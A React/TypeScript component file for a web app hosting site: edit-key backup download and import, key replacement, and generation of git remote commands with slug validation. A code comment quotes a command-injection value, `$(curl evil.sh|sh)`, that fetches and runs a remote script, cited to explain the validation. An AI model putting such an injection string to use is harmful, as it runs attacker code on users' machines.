import React, { useId, useState } from 'react';
import { ApiError } from '../../lib/api';
import type { KeyImportResult, KeyStoreResult } from '../../lib/keyStore';
import { exportKeyBackup, importKeyBackup } from '../../lib/keyBackup';
import { formatBytes } from '../../lib/format';
import { copyText } from '../../lib/share';
import { errorText } from './shared';

/** The most a key backup file may be. A backup is a line per app; a megabyte is thousands of them. */
const MAX_KEY_BACKUP_BYTES = 1024 * 1024;

/** Hand the visitor a file of their keys. A download, not a share URL: the keys never go in an address. */
async function downloadKeyBackup(passphrase: string): Promise<void> {
  const blob = new Blob([await exportKeyBackup(passphrase)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `softn-edit-keys-${new Date().toISOString().slice(0, 10)}.json`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}

/**
 * What to say about a key after trying to keep it. 'stored' is the quiet
 * case; the other two are the ones the visitor has to act on now, because
 * this page is the last time the key is shown.
 */
export function KeyKeptNotice({ kept }: { kept: KeyStoreResult }): React.ReactElement | null {
  if (kept === 'stored') return null;
  return (
    <p className="form-error" role="alert">
      {kept === 'blocked'
        ? 'This browser did not let the site keep the key. It is not stored anywhere else: copy it now, or download the backup, before leaving this page.'
        : 'The keys already kept in this browser could not be read, so this one was not added to them. Copy it now, or download the backup, before leaving this page.'}
    </p>
  );
}

/**
 * The backup download, with the one choice that decides what the file
 * exposes. Without a passphrase the file is the keys in plain text, and the
 * copy under the field says so; with one it is sealed in this browser (see
 * lib/keyBackup.ts) and opens only with that passphrase, which the site
 * never sees and cannot recover.
 */
export function KeyBackupDownload({ label = 'Download backup' }: { label?: string }): React.ReactElement {
  const [passphrase, setPassphrase] = useState('');
  const [error, setError] = useState<string | null>(null);
  const hintId = useId();
  return (
    <div className="key-backup">
      <label className="field">
        <span className="field-label">Passphrase for the backup file (optional)</span>
        <input type="password" value={passphrase} onChange={(e) => setPassphrase(e.target.value)} autoComplete="new-password" aria-describedby={hintId} />
        <span className="muted" id={hintId}>
          {passphrase === ''
            ? 'Without one, the file holds the keys as plain text: anyone who can read it can update or unpublish these apps. With one, it is encrypted in this browser and opens only with the passphrase.'
            : 'The file is encrypted with this passphrase and opens only with it. It cannot be recovered or reset, so keep the passphrase somewhere too.'}
        </span>
      </label>
      <button
        type="button"
        className="cta"
        onClick={() => {
          setError(null);
          downloadKeyBackup(passphrase).catch((err) => setError(err instanceof Error ? err.message : String(err)));
        }}
      >
        {label}
      </button>
      {error && (
        <p className="form-error" role="alert">
          {error}
        </p>
      )}
    </div>
  );
}

/**
 * The commands that make a project's git repository publish to this app. The app's name is the username in the
 * address, which is what makes git's credential helpers keep this app's key apart from another's. The key itself never
 * goes in the address: that would put it in the repository's config, in plain text. `http.postBuffer` makes git send a
 * large push with its length: sent in chunks, PHP behind Apache's FastCGI or CGI receives none of it.
 *
 * The remote's own push refspec makes a plain `git push softn` publish the commit checked out, from any branch. Without
 * it git answers that with `git push --set-upstream softn main`, and a branch that follows that pulls from the directory
 * from then on, which serves no fetches: every `git pull` fails, a project's own remote set aside. `skipFetchAll` leaves
 * it out of `git fetch --all` and `git remote update`.
 *
 * `git remote add` also writes a fetch refspec, which the directory has no use for and which did harm: with it, each
 * push leaves `refs/remotes/softn/main` behind, and `git push --force-with-lease softn` compares that with what the
 * directory offers, which is nothing, and refuses every push after the first as "stale info". The second line takes the
 * refspec away. Every line runs as it is in Command Prompt, PowerShell and a POSIX shell.
 *
 * These get pasted into a shell, so nothing goes in but what the directory itself allows as a name (Catalog::validSlug),
 * and anything else gives no commands. The directory answers loose spellings of a name, so a value from an address is
 * not one: `?update=$(curl evil.sh|sh)` opened a real app's page and put that in the commands.
 */
export function gitCommands(slug: string, origin: string): string {
  if (!/^[a-z0-9][a-z0-9-]{0,63}$/.test(slug)) return '';
  const site = new URL(origin);
  return [
    `git remote add softn ${site.protocol}//${slug}@${site.host}/api/git/${slug}.git`,
    'git config --unset remote.softn.fetch',
    'git config remote.softn.push HEAD:refs/heads/main',
    'git config remote.softn.skipFetchAll true',
    'git config http.postBuffer 64M',
    'git push softn',
  ].join('\n');
}

/** Publishing the next versions of an app from a git repository, with its edit key as the password. */
export function PushWithGit({ slug }: { slug: string }): React.ReactElement | null {
  const [copied, setCopied] = useState(false);
  const commands = gitCommands(slug, window.location.origin);
  if (!commands) return null;
  return (
    <section className="git-push">
      <h3 className="side-title">Publish new versions with git</h3>
      <p className="muted">
        Run the first five once in the app’s git repository, with its <code>manifest.json</code> at the top. From then on,{' '}
        <code>git push softn</code> publishes the commit you are on, from any branch. When git asks for a password, give it
        the edit key. Where git keeps passwords, it keeps this app’s under the app’s name. A push of the files the latest
        version already has publishes nothing new.
      </p>
      <pre className="source-code">
        <code>{commands}</code>
      </pre>
      <button
        type="button"
        className="link-btn"
        onClick={async () => {
          setCopied(await copyText(commands));
          setTimeout(() => setCopied(false), 1200);
        }}
      >
        {copied ? 'Copied' : 'Copy the commands'}
      </button>
      <p className="muted">
        Each push to <code>main</code> is a new version, made of the files in that commit. Earlier commits are not kept, and an app
        keeps its first version and its latest ones. Everything in the commit is public, so keep keys and passwords out of it, and
        save the key backup file somewhere outside the project. A push that holds this app’s key or a backup of keys is refused.
      </p>
    </section>
  );
}

/** What a key replacement left: the new key, and how keeping it here went (null: it was not to be kept). */
export interface ReplacedKey {
  key: string;
  kept: KeyStoreResult | null;
}

/**
 * Replace an app's edit key: for a key that may have been seen by someone
 * else, since a key is all it takes to publish over the app, change it or
 * take it down. It asks first, because everything else holding the current
 * key (another browser, a script, a backup) stops working at once. `run`
 * makes the replacement and keeps the new key where the caller keeps keys;
 * this says what became of the old one, shows the new one once, and offers
 * a backup of the keys this browser now holds.
 */
export function ReplaceKey({ run, disabled = false, compact = false }: { run: () => Promise<ReplacedKey>; disabled?: boolean; compact?: boolean }): React.ReactElement {
  const [stage, setStage] = useState<'idle' | 'confirm' | 'busy'>('idle');
  const [replaced, setReplaced] = useState<ReplacedKey | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const go = async () => {
    setStage('busy');
    setError(null);
    try {
      setReplaced(await run());
    } catch (err) {
      setError(err instanceof ApiError && (err.status === 401 || err.status === 403) ? 'That edit key does not open this app, so nothing was replaced.' : errorText(err));
    } finally {
      setStage('idle');
    }
  };
  return (
    <div className="key-replace">
      {stage === 'confirm' ? (
        <p className="muted">
          Replace it? Anything that uses the current key (another browser, a script, a backup) stops working until it is given the new one.{' '}
          <button type="button" className="link-btn" onClick={() => void go()}>
            Yes, replace it
          </button>{' '}
          <button type="button" className="link-btn" onClick={() => setStage('idle')}>
            Keep the current key
          </button>
        </p>
      ) : (
        <button
          type="button"
          className={compact ? 'link-btn' : 'cta'}
          disabled={disabled || stage === 'busy'}
          onClick={() => {
            setReplaced(null);
            setError(null);
            setStage('confirm');
          }}
        >
          {stage === 'busy' ? 'Replacing…' : 'Replace key'}
        </button>
      )}
      {error && (
        <p className="form-error" role="alert">
          {error}
        </p>
      )}
      {replaced && (
        <div className="key-replaced">
          <p role="status">
            <strong>The key is replaced.</strong> The old key no longer works anywhere: not in other browsers, not in scripts, and not in
            backups made before now. Give the new one to whatever needs it.
          </p>
          <div className="keybox-row">
            <code className="keybox-key">{replaced.key}</code>
            <button
              type="button"
              className="cta"
              onClick={async () => {
                setCopied(await copyText(replaced.key));
                setTimeout(() => setCopied(false), 1200);
              }}
            >
              {copied ? 'Copied' : 'Copy'}
            </button>
          </div>
          {replaced.kept === 'stored' ? (
            <>
              <p className="muted">It is kept in this browser in place of the old one. A backup made before now holds the old key, which opens nothing: download a new one.</p>
              <KeyBackupDownload label="Download a new backup" />
            </>
          ) : replaced.kept === null ? (
            <p className="form-error">It is not kept in this browser, as you asked. Copy it now: once you leave this page it is not shown again.</p>
          ) : (
            <KeyKeptNotice kept={replaced.kept} />
          )}
        </div>
      )}
    </div>
  );
}

/** What an import did, in a sentence. */
function describeImport(result: KeyImportResult): string {
  const parts: string[] = [];
  if (result.added.length > 0) parts.push(`${result.added.length} ${result.added.length === 1 ? 'key' : 'keys'} restored`);
  if (result.unchanged.length > 0) parts.push(`${result.unchanged.length} already here`);
  if (result.conflicts.length > 0) parts.push(`${result.conflicts.length} kept as they were (the file held a different key for ${result.conflicts.join(', ')})`);
  if (result.rejected.length > 0) parts.push(`${result.rejected.length} not a key: ${result.rejected.join(', ')}`);
  if (result.stored === 'blocked') parts.push('this browser did not let the site store them');
  if (result.stored === 'unreadable') parts.push('the keys already here could not be read, so nothing was changed');
  return parts.length > 0 ? `${parts.join('; ')}.` : 'The file held no keys.';
}

/**
 * A backup file coming back in. Reports what it did, entry by entry; never
 * wipes what is held. An encrypted file asks for its passphrase first, and
 * a passphrase that does not open it leaves the keys here as they were.
 */
export function KeyImport({ onImported }: { onImported?: () => void }): React.ReactElement {
  const [report, setReport] = useState<string | null>(null);
  /** An encrypted file waiting for its passphrase: its text, held until it opens or is given up on. */
  const [sealed, setSealed] = useState<{ name: string; text: string } | null>(null);
  const [passphrase, setPassphrase] = useState('');
  const [refused, setRefused] = useState<string | null>(null);
  /** A passphrase being tried. Deriving the key takes a moment, and a second press or Enter meanwhile started a second try. */
  const [unlocking, setUnlocking] = useState(false);
  const finish = (result: KeyImportResult) => {
    setReport(describeImport(result));
    if (result.added.length > 0 && result.stored === 'stored') onImported?.();
  };
  const take = async (file: File | undefined) => {
    if (!file) return;
    setReport(null);
    setRefused(null);
    // Judged by size before it is read: the picker's file type is a hint,
    // and a file chosen by mistake is otherwise read whole into a string.
    if (file.size > MAX_KEY_BACKUP_BYTES) {
      setSealed(null);
      setReport(`${file.name} is ${formatBytes(file.size)}: too large to be a key backup, so it was not read.`);
      return;
    }
    // A file that went away after it was picked (a detached drive, a file
    // replaced meanwhile) fails here, and nothing was listening.
    let text: string;
    try {
      text = await file.text();
    } catch {
      setSealed(null);
      setReport(`${file.name} could not be read. Nothing was changed; choose the file again.`);
      return;
    }
    const outcome = await importKeyBackup(text);
    if (outcome.kind === 'needs-passphrase') {
      setSealed({ name: file.name, text });
      setPassphrase('');
      return;
    }
    setSealed(null);
    if (outcome.kind === 'refused') setReport(outcome.message);
    else finish(outcome.result);
  };
  const unlock = async () => {
    if (!sealed || passphrase === '' || unlocking) return;
    setUnlocking(true);
    try {
      const outcome = await importKeyBackup(sealed.text, passphrase);
      if (outcome.kind === 'needs-passphrase') return;
      if (outcome.kind === 'refused') {
        setRefused(outcome.message);
        return;
      }
      setSealed(null);
      setPassphrase('');
      setRefused(null);
      finish(outcome.result);
    } finally {
      setUnlocking(false);
    }
  };
  return (
    <div className="key-import">
      <label className="field">
        <span className="field-label">Restore keys from a backup file</span>
        <input
          type="file"
          accept="application/json,.json"
          onChange={(e) => {
            void take(e.target.files?.[0]);
            e.target.value = '';
          }}
        />
        {report && (
          <span className="muted" role="status">
            {report}
          </span>
        )}
      </label>
      {sealed && (
        <div className="field">
          <label className="field">
            <span className="field-label">{sealed.name} is encrypted. Its passphrase:</span>
            <input
              type="password"
              value={passphrase}
              onChange={(e) => setPassphrase(e.target.value)}
              autoComplete="off"
              aria-invalid={refused ? true : undefined}
              onKeyDown={(e) => {
                if (e.key === 'Enter') {
                  e.preventDefault();
                  void unlock();
                }
              }}
            />
          </label>
          {refused && (
            <p className="form-error" role="alert">
              {refused}
            </p>
          )}
          <div className="app-actions">
            <button type="button" className="cta" disabled={passphrase === '' || unlocking} onClick={() => void unlock()}>
              {unlocking ? 'Opening…' : 'Open the backup'}
            </button>
            <button
              type="button"
              className="link-btn"
              disabled={unlocking}
              onClick={() => {
                setSealed(null);
                setPassphrase('');
                setRefused(null);
              }}
            >
              Never mind
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
